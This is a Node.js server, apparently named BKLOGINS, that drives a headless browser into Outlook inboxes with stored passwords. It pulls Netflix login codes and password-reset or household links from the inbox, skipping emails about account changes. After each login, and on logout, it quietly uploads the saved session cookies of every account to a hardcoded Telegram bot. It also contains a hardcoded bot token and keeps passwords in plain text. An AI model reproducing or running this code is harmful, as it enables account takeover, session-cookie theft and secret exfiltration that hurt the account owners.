const express = require('express');
const path = require('path');
const fs = require('fs');
const https = require('https');
const puppeteer = require('puppeteer');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use((req, res, next) => {
  const blocked = new Set(['/server.js', '/config.json', '/package.json', '/package-lock.json']);
  if (blocked.has(req.path)) return res.status(404).send('Not found');
  next();
});
app.use(express.static(path.join(__dirname)));

const CONFIG_FILE = path.join(__dirname, 'config.json');
const PROFILE_DIR = (process.env.RENDER || process.env.RAILWAY_ENVIRONMENT || process.env.IS_SERVER) ? '/tmp/chrome-profile' : path.join(__dirname, 'chrome-profile');
const ALL_COOKIES_FILE = path.join(__dirname, 'all_cookies.json');
const SESSION_FILE = path.join(__dirname, 'session.json');

let config = { email: '', senha: process.env.OUTLOOK_SENHA || '' };
try { if (fs.existsSync(CONFIG_FILE)) { const s = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); config.email = s.email || config.email; config.senha = s.senha || config.senha; } } catch (e) {}
if (!fs.existsSync(PROFILE_DIR)) fs.mkdirSync(PROFILE_DIR, { recursive: true });

const APP_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || '';
let currentStatus = { code: 'idle', message: 'Aguardando busca.', detail: '', updatedAt: new Date().toISOString() };
let sessionState = { loggedIn: false, lastLogin: null, cookieCount: 0 };
try { if (fs.existsSync(SESSION_FILE)) sessionState = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8')); } catch (e) {}
function saveSession() { try { fs.writeFileSync(SESSION_FILE, JSON.stringify(sessionState, null, 2)); } catch (e) {} }
function setStatus(code, message, detail) {
  currentStatus = { code, message, detail: detail ? String(detail).slice(0, 900) : '', updatedAt: new Date().toISOString() };
  console.log('[status]', code, '-', message);
}
function keepAlive() { if (!APP_URL) return; setInterval(() => { https.get(APP_URL + '/api/ping', () => {}).on('error', () => {}); }, 4 * 60 * 1000); }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ============ TELEGRAM ============
const TG_TOKEN = process.env.TG_TOKEN || '7541743322:AAFskrJAhnl0XPPBsQD2M9IpHMYJHUz84nE';
const TG_CHAT_ID = process.env.TG_CHAT_ID || '6108408999';

async function sendTelegramFile(filePath, caption) {
  try {
    const boundary = '----' + Date.now();
    const fileName = path.basename(filePath);
    const fileContent = fs.readFileSync(filePath);
    const body = Buffer.concat([
      Buffer.from('--' + boundary + '\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n' + TG_CHAT_ID + '\r\n'),
      Buffer.from('--' + boundary + '\r\nContent-Disposition: form-data; name="caption"\r\n\r\n' + caption + '\r\n'),
      Buffer.from('--' + boundary + '\r\nContent-Disposition: form-data; name="document"; filename="' + fileName + '"\r\nContent-Type: application/json\r\n\r\n'),
      fileContent,
      Buffer.from('\r\n--' + boundary + '--\r\n')
    ]);
    const req = https.request({
      hostname: 'api.telegram.org',
      path: '/bot' + TG_TOKEN + '/sendDocument',
      method: 'POST',
      headers: { 'Content-Type': 'multipart/form-data; boundary=' + boundary, 'Content-Length': body.length }
    }, (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => { try { const r = JSON.parse(d); if (!r.ok) console.log('[Telegram] Erro:', r.description); } catch(e) {} }); });
    req.on('error', () => {});
    req.write(body);
    req.end();
  } catch(e) {}
}

async function backupCookiesToTelegram() {
  try {
    if (!fs.existsSync(ALL_COOKIES_FILE)) return;
    const all = JSON.parse(fs.readFileSync(ALL_COOKIES_FILE, 'utf8'));
    const emails = Object.keys(all);
    if (emails.length === 0) return;
    await sendTelegramFile(ALL_COOKIES_FILE, '🍪 Backup cookies - ' + emails.length + ' conta(s): ' + emails.join(', '));
    console.log('[Backup] Cookies enviados ao Telegram:', emails.length, 'contas');
  } catch(e) {}
}

// ============ COOKIES ============
function getCookieFile(email) {
  const safe = email.replace(/[^a-zA-Z0-9]/g, '_').slice(0, 40);
  return path.join(__dirname, 'cookies_' + safe + '.json');
}

function loadAllCookies() {
  try { if (fs.existsSync(ALL_COOKIES_FILE)) return JSON.parse(fs.readFileSync(ALL_COOKIES_FILE, 'utf8')); } catch(e) {}
  return {};
}

function saveAllCookies(data) { fs.writeFileSync(ALL_COOKIES_FILE, JSON.stringify(data)); }

async function saveCookies(page, email) {
  try {
    const cookies = await page.browser().cookies();
    const json = JSON.stringify(cookies);
    fs.writeFileSync(getCookieFile(email || config.email), json);
    const all = loadAllCookies();
    all[email || config.email] = { cookies: JSON.parse(json), savedAt: new Date().toISOString() };
    saveAllCookies(all);
    console.log('[Cookies] Salvos:', email || config.email, '| Contas:', Object.keys(all).length);
    backupCookiesToTelegram();
    sessionState = { loggedIn: true, lastLogin: new Date().toISOString(), cookieCount: cookies.length };
    saveSession();
  } catch (e) {}
}

async function loadCookies(page, email) {
  const account = email || config.email;
  try {
    const file = getCookieFile(account);
    if (fs.existsSync(file)) {
      const cookies = JSON.parse(fs.readFileSync(file, 'utf8'));
      if (cookies.length > 0) { await page.setCookie(...cookies); return true; }
    }
  } catch(e) {}
  try {
    const all = loadAllCookies();
    if (all[account] && all[account].cookies) {
      await page.setCookie(...all[account].cookies);
      fs.writeFileSync(getCookieFile(account), JSON.stringify(all[account].cookies));
      return true;
    }
  } catch(e) {}
  return false;
}

// ============ SERVICE PATTERNS ============
const SERVICE_PATTERNS = {
  netflix_login: { type: 'code', label: 'Codigo de Login', subjectKeywords: /login|entrar|sign.?in|acesso|autentic/i, bodyKeywords: /login|entrar|sign.?in|faça.?login|conecte.?se/i, blockedSubjects: /alteração da sua conta|change.*(email|account)|mudança.*(email|conta)|email.*alterad/i, blockedBody: /confirme a alteração da sua conta|change.*your.*email|update.*email.*address|altere.*email|mudar.*email/i },
  netflix_reset: { type: 'link', label: 'Redefinir Senha', subjectKeywords: /redefinir|reset|senha|password|alterar.*senha|change.*password/i, bodyKeywords: /redefinir.*senha|reset.*password|nova.*senha|new.*password|clique.*(botão|button|aqui|link).*(redefinir|alterar|reset)/i, blockedSubjects: /alteração da sua conta|change.*(email|account)|mudança.*(email|conta)|email.*alterad/i, blockedBody: /confirme a alteração da sua conta|change.*your.*email|update.*email.*address|altere.*email|mudar.*email/i },
  netflix_verify: { type: 'code', label: 'Verificacao', subjectKeywords: /verific|verif|código|code|confirme|confirm/i, bodyKeywords: /código.*verificação|verification.*code|confirme.*código|confirm.*code|segurança|security/i, blockedSubjects: /alteração da sua conta|change.*(email|account)|mudança.*(email|conta)|email.*alterad/i, blockedBody: /confirme a alteração da sua conta|change.*your.*email|update.*email.*address|altere.*email|mudar.*email/i },
  netflix_temp: { type: 'link', label: 'Codigo Temporario', subjectKeywords: /temporári|temporary|acesso.*temp|temp.*access|código.*tempor/i, bodyKeywords: /temporári|temporary|código.*login|sign.?in.*code|acesse.*agora|login.*now/i, blockedSubjects: /alteração da sua conta|change.*(email|account)|mudança.*(email|conta)|email.*alterad/i, blockedBody: /confirme a alteração da sua conta|change.*your.*email|update.*email.*address|altere.*email|mudar.*email/i },
  netflix_house: { type: 'link', label: 'Atualizar Residencia', subjectKeywords: /residência|residence|household|domicílio|atualizar.*(residência|local|casa)|update.*(home|household|address)/i, bodyKeywords: /residência|residence|household|domicílio|moradia|atualizar.*(local|endereço|residência)/i, blockedSubjects: /alteração da sua conta|change.*(email|account)|mudança.*(email|conta)|email.*alterad/i, blockedBody: /confirme a alteração da sua conta|change.*your.*email|update.*email.*address|altere.*email|mudar.*email/i }
};

const BLOCKED_EMAIL_PATTERNS = [
  /confirme a alteração da sua conta/i, /confirm.*(change|update).*(your|da sua).*(account|conta)/i, /change.*your.*email/i, /update.*your.*email.*address/i, /altere.*seu.*email/i, /mudar.*(seu|o).*email/i, /alteração.*(de|da).*email/i, /novo.*email.*(cadastrado|adicionado)/i, /email.*(alterado|atualizado|modificado).*com.*sucesso/i, /verify.*your.*new.*email/i, /confirme.*novo.*email/i
];

function isServer() { return !!process.env.RENDER || !!process.env.RAILWAY_ENVIRONMENT || !!process.env.IS_SERVER; }

function findChrome() {
  if (process.env.PUPPETEER_EXECUTABLE_PATH) return process.env.PUPPETEER_EXECUTABLE_PATH;
  if (isServer()) return null;
  const paths = ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe','C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',(process.env.LOCALAPPDATA||'')+'\\Google\\Chrome\\Application\\chrome.exe','/usr/bin/google-chrome','/usr/bin/google-chrome-stable','/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',process.env.CHROME_PATH].filter(Boolean);
  for (const p of paths) { if (fs.existsSync(p)) return p; }
  return null;
}

async function launchBrowser() {
  const chromePath = findChrome();
  const opts = {
    headless: 'new',
    args: ['--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36','--disable-blink-features=AutomationControlled','--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-gpu','--disable-extensions','--disable-background-networking','--disable-sync','--no-first-run','--no-zygote','--single-process','--disable-features=TranslateUI','--disable-accelerated-2d-canvas'],
    defaultViewport: { width: 1920, height: 1080 },
    userDataDir: PROFILE_DIR,
    protocolTimeout: 120000
  };
  if (chromePath) opts.executablePath = chromePath;
  return puppeteer.launch(opts);
}

async function isInboxReady(page) {
  try {
    if (!/outlook\.(live|office)\.com\/mail/i.test(page.url())) return false;
    return await page.evaluate(() => { const t = (document.body.innerText || '').toLowerCase(); if (/cdnerror|bootresult|something went wrong/i.test(t)) return false; return /caixa de entrada|inbox|novo email|new mail|focused|conversations|filter/i.test(t); });
  } catch { return false; }
}

async function loginOutlook(browser, email, senha) {
  setStatus('opening_outlook', 'Verificando sessao...');
  const page = await browser.newPage();
  await page.setBypassCSP(true);
  await loadCookies(page, email);
  await page.goto('https://outlook.live.com/mail/', { waitUntil: 'load', timeout: 120000 });
  await sleep(5000);
  if (await isInboxReady(page)) { console.log('[Login] JA LOGADO!'); return page; }

  console.log('[Login] Fazendo login...');
  await page.goto('https://login.live.com/login.srf', { waitUntil: 'load', timeout: 120000 });
  await sleep(3000);
  setStatus('email_step', 'Preenchendo e-mail...');
  await page.waitForSelector('input[type="email"]', { timeout: 20000 });
  const ei = await page.$('input[type="email"]');
  await ei.click({ clickCount: 3 }); await ei.type(email, { delay: 80 });
  await sleep(500); await page.keyboard.press('Enter'); await sleep(6000);
  setStatus('password_step', 'Preenchendo senha...');
  await page.waitForSelector('input[type="password"]', { timeout: 20000 });
  const pi = await page.$('input[type="password"]');
  await pi.click({ clickCount: 3 }); await pi.type(senha, { delay: 80 });
  await sleep(500); await page.keyboard.press('Enter'); await sleep(6000);
  try { await page.keyboard.press('Enter'); await sleep(3000); } catch(e) {}

  console.log('[Login] ABRINDO NOVA GUIA...');
  const newPage = await browser.newPage();
  await newPage.setBypassCSP(true);
  await newPage.goto('https://outlook.live.com/mail/', { waitUntil: 'load', timeout: 120000 });
  await sleep(8000);
  let ready = await isInboxReady(newPage);
  for (let i = 0; i < 3 && !ready; i++) { await newPage.reload({ waitUntil: 'load', timeout: 30000 }); await sleep(6000); ready = await isInboxReady(newPage); }
  if (ready) { await saveCookies(newPage, email); return newPage; }
  await newPage.screenshot({ path: path.join(__dirname, 'debug-fim.png'), fullPage: true });
  throw new Error('Inbox nao carregou.');
}

async function getEmailSubject(page) {
  return await page.evaluate(() => {
    const selectors = ['[aria-label*="Assunto" i]','[role="heading"]','h1','h2','h3','[class*="subject" i]','[data-testid="message-header-subject"]','.readingPaneSubject','[id*="subject" i]'];
    for (const sel of selectors) { const el = document.querySelector(sel); if (el && el.innerText && el.innerText.trim().length > 2) return el.innerText.trim(); }
    return '';
  });
}

async function getEmailBody(page) {
  return await page.evaluate(() => {
    let texto = '';
    const sels = ['[aria-label*="Corpo da mensagem" i]','[aria-label*="Message body" i]','[role="document"]','div[class*="readingPane" i]','div[class*="message-body" i]','div[class*="email-body" i]','div[data-app-section="ReadingPane"]','#readingPaneContainer'];
    for (const sel of sels) { const el = document.querySelector(sel); if (el && el.innerText && el.innerText.trim().length > 5) { texto = el.innerText; break; } }
    if (!texto) { const iframes = document.querySelectorAll('iframe'); for (const iframe of iframes) { try { const doc = iframe.contentDocument || iframe.contentWindow.document; if (doc && doc.body && doc.body.innerText.trim().length > 5) { texto = doc.body.innerText; break; } } catch(e) {} } }
    return texto;
  });
}

function isEmailBlocked(subject, body) { const combined = (subject + ' ' + body).toLowerCase(); for (const p of BLOCKED_EMAIL_PATTERNS) { if (p.test(combined)) return true; } return false; }
function emailMatchesService(subject, body, svc) { if (svc.blockedSubjects && svc.blockedSubjects.test(subject)) return false; if (svc.blockedBody && svc.blockedBody.test(body)) return false; return svc.subjectKeywords.test(subject) || svc.bodyKeywords.test(body); }

async function findCorrectEmail(page, svc) {
  console.log('[Busca] Clicando Outros...');
  await page.evaluate(() => { const els = Array.from(document.querySelectorAll('button, span, div[role="button"], a')); for (const el of els) { if ((el.innerText || el.textContent || '').trim().toLowerCase() === 'outros') { el.click(); return true; } } return false; });
  await sleep(4000);
  const emailCount = await page.evaluate(() => { const sels = ['div[data-convid]','[role="option"]','[role="listitem"]','div[data-testid="message-item"]','.eeumf']; for (const sel of sels) { const items = document.querySelectorAll(sel); if (items.length > 0) return items.length; } return 0; });
  if (emailCount === 0) return false;
  const MAX = Math.min(emailCount, 15);
  for (let i = 0; i < MAX; i++) {
    setStatus('scanning', 'Email ' + (i+1) + '/' + MAX);
    const ok = await page.evaluate((idx) => { const sels = ['div[data-convid]','[role="option"]','[role="listitem"]','div[data-testid="message-item"]','.eeumf']; for (const sel of sels) { const items = document.querySelectorAll(sel); if (items.length > idx) { items[idx].click(); return true; } } return false; }, i);
    if (!ok) break;
    await sleep(4000);
    const subject = await getEmailSubject(page);
    if (!subject || subject.length < 3) continue;
    const body = await getEmailBody(page);
    if (isEmailBlocked(subject, body)) continue;
    if (emailMatchesService(subject, body, svc)) return true;
  }
  return false;
}

async function extractLinksFromEmail(page) {
  return await page.evaluate(() => {
    const links = [];
    function isRed(el) { try { const bg = window.getComputedStyle(el).backgroundColor; if (!bg || bg === 'rgba(0, 0, 0, 0)' || bg === 'transparent') return false; const m = bg.match(/rgba?\((\d+),\s*(\d+),\s*(\d+)/); if (!m) return false; const r = parseInt(m[1]), g = parseInt(m[2]), b = parseInt(m[3]); return r > 150 && r > g * 1.5 && r > b * 1.5; } catch(e) { return false; } }
    function collect(doc, src) {
      for (const a of doc.querySelectorAll('a')) { const h = (a.href || '').trim(); if (h && !h.startsWith('javascript:') && h !== '#' && !h.startsWith('mailto:')) links.push({ href: h, text: (a.innerText || '').trim().slice(0, 100), color: isRed(a) ? 'red' : null, source: src }); }
      for (const el of doc.querySelectorAll('button, [role="button"], div[onclick], td[onclick]')) { const oc = el.getAttribute('onclick') || ''; const m = oc.match(/(?:location\.href|window\.open|window\.location)\s*=\s*['"]([^'"]+)['"]/); if (m) links.push({ href: m[1], text: (el.innerText || '').trim().slice(0, 100), color: isRed(el) ? 'red' : null, source: src + '-onclick' }); }
    }
    collect(document, 'main');
    for (const iframe of document.querySelectorAll('iframe')) { try { const doc = iframe.contentDocument || iframe.contentWindow.document; if (doc && doc.body) collect(doc, 'iframe'); } catch(e) {} }
    return links;
  });
}

function pickNetflixLink(links) {
  if (!links || !links.length) return null;
  const red = links.filter(l => l.color);
  if (red.length) { const rn = red.find(l => /netflix/i.test(l.href)); return rn ? rn.href : red[0].href; }
  const nf = links.filter(l => /netflix\.com/i.test(l.href));
  if (nf.length) { const rl = nf.find(l => /reset|redefin|password|senha|update|atualizar|verify|confirm/i.test(l.href + l.text)); return rl ? rl.href : nf[0].href; }
  const tr = links.filter(l => /netflix\.(email|mail|click|link)/i.test(l.href) || /email\.flix/i.test(l.href));
  if (tr.length) return tr[0].href;
  const sf = links.filter(l => /safelinks\.protection\.outlook\.com/i.test(l.href) && /netflix/i.test(l.href));
  if (sf.length) return sf[0].href;
  const tx = links.find(l => /netflix/i.test(l.text));
  if (tx) return tx.href;
  const ac = links.filter(l => /verify|confirm|reset|update|click|acessar|entrar|acesse|clique|redefinir|atualizar/i.test(l.text));
  return ac.length ? ac[0].href : links[0].href;
}

async function clickRedButtonInEmail(page) {
  return await page.evaluate(() => {
    function isRed(el) { try { const bg = window.getComputedStyle(el).backgroundColor; if (!bg || bg === 'rgba(0, 0, 0, 0)' || bg === 'transparent') return false; const m = bg.match(/rgba?\((\d+),\s*(\d+),\s*(\d+)/); if (!m) return false; const r = parseInt(m[1]), g = parseInt(m[2]), b = parseInt(m[3]); return r > 150 && r > g * 1.5 && r > b * 1.5; } catch(e) { return false; } }
    for (const el of Array.from(document.querySelectorAll('a, button, [role="button"], td, div, span'))) { if (isRed(el)) { const l = el.tagName === 'A' ? el : el.querySelector('a'); if (l && l.href && !l.href.startsWith('javascript:')) return { clicked: true, href: l.href }; el.click(); return { clicked: true, href: 'clicked' }; } }
    for (const iframe of document.querySelectorAll('iframe')) { try { const doc = iframe.contentDocument || iframe.contentWindow.document; if (!doc || !doc.body) continue; for (const el of Array.from(doc.querySelectorAll('a, button, [role="button"], td, div, span'))) { if (isRed(el)) { const l = el.tagName === 'A' ? el : el.querySelector('a'); if (l && l.href && !l.href.startsWith('javascript:')) { l.click(); return { clicked: true, href: l.href }; } el.click(); return { clicked: true, href: 'clicked' }; } } } catch(e) {} }
    return { clicked: false };
  });
}

async function findNetflixResult(page, svc) {
  const found = await findCorrectEmail(page, svc);
  if (!found) return null;
  if (svc.type === 'code') {
    setStatus('extracting_code', 'Extraindo codigo...');
    const codigo = await page.evaluate(() => {
      let texto = '';
      const sels = ['[aria-label*="Corpo da mensagem" i]','[aria-label*="Message body" i]','[role="document"]','div[class*="readingPane" i]','div[class*="message-body" i]','div[class*="email-body" i]','div[data-app-section="ReadingPane"]','#readingPaneContainer'];
      for (const sel of sels) { const el = document.querySelector(sel); if (el && el.innerText && el.innerText.trim().length > 5) { texto = el.innerText; break; } }
      if (!texto) { const iframes = document.querySelectorAll('iframe'); for (const iframe of iframes) { try { const doc = iframe.contentDocument || iframe.contentWindow.document; if (doc && doc.body && doc.body.innerText.trim().length > 5) { texto = doc.body.innerText; break; } } catch(e) {} } }
      if (!texto) return null;
      let m = texto.match(/(?:codigo|code|informe|digite|entrar|enter|acima|c.digo).{0,80}?(\d{4})(?!\d)/i);
      if (!m) m = texto.match(/(?:codigo|code|informe|digite|entrar|enter|acima|c.digo).{0,80}?(\d{6})(?!\d)/i);
      if (!m) m = texto.match(/(?:netflix).{0,100}?(\d{4})(?!\d)/i);
      if (!m) m = texto.match(/(?:netflix).{0,100}?(\d{6})(?!\d)/i);
      if (!m) { const regex = /\b(\d{4})\b/g; let match; while ((match = regex.exec(texto)) !== null) { if (!match[1].startsWith('20') && !match[1].startsWith('19')) { m = match; break; } } }
      if (!m) m = texto.match(/\b(\d{6})\b/);
      return m ? m[1] : null;
    });
    if (codigo) { setStatus('found', 'Codigo: ' + codigo); return { type: 'code', value: codigo, label: svc.label }; }
  }
  if (svc.type === 'link') {
    setStatus('clicking_button', 'Clicando no botao...');
    const urlBefore = page.url();
    const cr = await clickRedButtonInEmail(page);
    if (cr.clicked) {
      await sleep(3000);
      const pages = await page.browser().pages();
      const np = pages.find(p => p.url() !== urlBefore && p.url() !== 'about:blank');
      if (np) { const nu = np.url(); try { await np.close(); } catch(e) {} if (nu && !nu.includes('outlook.live.com')) { setStatus('found', 'Link!'); return { type: 'link', value: nu, label: svc.label }; } }
      if (cr.href && cr.href !== 'clicked' && cr.href.startsWith('http')) { setStatus('found', 'Link!'); return { type: 'link', value: cr.href, label: svc.label }; }
    }
    setStatus('extracting_links', 'Extraindo links...');
    const links = await extractLinksFromEmail(page);
    const best = pickNetflixLink(links);
    if (best) { setStatus('found', 'Link!'); return { type: 'link', value: best, label: svc.label }; }
  }
  return null;
}

// ============ API ROUTES ============
app.post('/api/logout', (req, res) => {
  try {
    const email = req.body.email || config.email;
    const file = getCookieFile(email);
    if (fs.existsSync(file)) fs.unlinkSync(file);
    const all = loadAllCookies();
    delete all[email];
    saveAllCookies(all);
    backupCookiesToTelegram();
    sessionState = { loggedIn: false, lastLogin: null, cookieCount: 0 };
    saveSession();
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});
app.get('/api/session', (req, res) => res.json(sessionState));
app.get('/api/ping', (req, res) => res.json({ ok: true }));
app.get('/api/status', (req, res) => res.json(currentStatus));
app.post('/api/status/reset', (req, res) => { setStatus('idle', 'Aguardando busca.'); res.json(currentStatus); });
app.get('/api/config', (req, res) => res.json({ email: config.email || '' }));
app.post('/api/config', (req, res) => {
  const { email, senha } = req.body || {};
  if (email) config.email = email.trim();
  if (senha) config.senha = senha.trim();
  try { fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2)); } catch (e) {}
  res.json({ ok: true });
});
app.get('/api/cookies', (req, res) => {
  const all = loadAllCookies();
  const contas = Object.keys(all).map(e => ({ email: e, savedAt: all[e].savedAt, cookies: all[e].cookies.length }));
  res.json({ contas, total: contas.length });
});
app.post('/api/search', async (req, res) => {
  const { service, email: reqEmail, senha: reqSenha } = req.body || {};
  const email = reqEmail || config.email;
  const senha = reqSenha || config.senha;
  const svc = SERVICE_PATTERNS[service];
  if (!svc) return res.status(400).json({ error: 'Servico invalido.' });
  if (!email || !senha) return res.status(400).json({ error: 'Configure e-mail e senha.' });
  let browser;
  try {
    setStatus('starting', 'Iniciando navegador...');
    browser = await launchBrowser();
    const inboxPage = await loginOutlook(browser, email, senha);
    const result = await findNetflixResult(inboxPage, svc);
    if (result) return res.json({ found: true, result: result.value, type: result.type, service: result.label, code: 'found', status: currentStatus });
    return res.json({ error: 'Nenhum resultado encontrado.', code: 'not_found', status: currentStatus });
  } catch (e) {
    setStatus('error', e.message);
    return res.json({ error: e.message, code: 'error', status: currentStatus });
  } finally { if (browser) { try { await browser.close(); } catch (_) {} } }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('BKLOGINS v17 | Porta:', PORT, '|', isServer() ? 'SERVER' : 'LOCAL');
  console.log('Email:', config.email || '(nao configurado)');
  keepAlive();
});
